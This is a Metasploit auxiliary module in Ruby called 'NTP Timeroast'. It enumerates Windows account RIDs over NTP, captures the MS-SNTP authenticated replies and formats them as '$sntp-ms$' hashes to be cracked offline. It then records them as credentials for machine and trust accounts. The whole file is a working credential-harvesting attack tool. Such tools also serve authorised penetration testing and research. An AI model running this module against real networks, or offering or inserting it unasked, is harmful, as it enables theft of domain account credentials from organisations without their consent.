##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'NTP Timeroast',
        'Description' => %q{
          Windows authenticates NTP requests by calculating the message digest using the NT hash followed by the first
          48 bytes of the NTP message (all fields preceding the key ID). An attacker can abuse this to recover hashes
          that can be cracked offline for machine and trust accounts. The attacker must know the accounts RID, but
          because RIDs are sequential, they can easily be enumerated.
        },
        'Author' => [
          'Tom Tervoort',
          'Spencer McIntyre'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/SecuraBV/Timeroast/'],
          ['URL', 'https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf']
        ],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options([
      Opt::RPORT(123),
      OptIntRange.new('RIDS', [ true, 'The RIDs to enumerate (e.g. 1000-2000).' ]),
      OptInt.new('DELAY', [ true, 'The delay in milliseconds between attempts.', 20]),
      OptInt.new('TIMEOUT', [ true, 'The timeout in seconds to wait at the end for replies.', 5])
    ])
  end

  def validate
    super

    errors = {}
    errors['DELAY'] = 'DELAY can not be negative.' if datastore['DELAY'].to_i < 0
    errors['TIMEOUT'] = 'TIMEOUT can not be negative.' if datastore['TIMEOUT'].to_i < 0
    raise ::Msf::OptionValidateError, errors unless errors.empty?
  end

  def build_ntp_probe(rid)
    probe = Rex::Proto::NTP::Header::NTPHeader.new
    probe.leap_indicator = 3
    probe.version_number = 3
    probe.mode = Rex::Proto::NTP::Mode::CLIENT
    probe.key_identifier = [rid].pack('L>').unpack1('L<') # NTP uses big endian but MS uses little endian for this one field
    probe.message_digest = Random.random_bytes(OpenSSL::Digest.new('MD5').digest_length).unpack('C*')
    probe
  end

  def recv_response(timeout: 0)
    begin
      raw, = udp_sock.recvfrom(68, timeout) # 68 is always the number of bytes expected
    rescue ::Rex::SocketError, ::IOError
      return nil
    end

    return nil if raw.empty?

    Rex::Proto::NTP::Header::NTPHeader.read(raw)
  end

  def run_host(_ip)
    connect_udp

    delay = datastore['DELAY'].to_i
    pending = 0

    Msf::OptIntRange.parse(datastore['RIDS']).each do |rid|
      vprint_status("Checking RID: #{rid}")
      probe = build_ntp_probe(rid)
      udp_sock.put(probe.to_binary_s)
      pending += 1

      sleep(delay / 1000.0)

      response = recv_response
      next unless response

      process_response(response)
      pending -= 1
    end

    return if pending == 0

    print_status("Waiting on #{pending} pending responses...")
    remaining = 10
    while remaining > 0 && pending > 0
      response, elapsed_time = Rex::Stopwatch.elapsed_time do
        recv_response(timeout: remaining)
      end
      remaining -= elapsed_time
      next unless response

      process_response(response)
      pending -= 1
    end
  ensure
    disconnect_udp
  end

  def process_response(response)
    resp_rid = [response.key_identifier].pack('L<').unpack1('L>')
    message_digest = response.message_digest.pack('C*')
    salt = response.to_binary_s[0...response.offset_of(response.key_identifier)]
    hash = "$sntp-ms$#{message_digest.unpack1('H*')}$#{salt.unpack1('H*')}"

    print_good("Hash for RID: #{resp_rid} - #{resp_rid}:#{hash}")
    report_hash(hash)
  end

  def report_hash(hash)
    jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'ntp',
      protocol: 'udp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: jtr_format
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
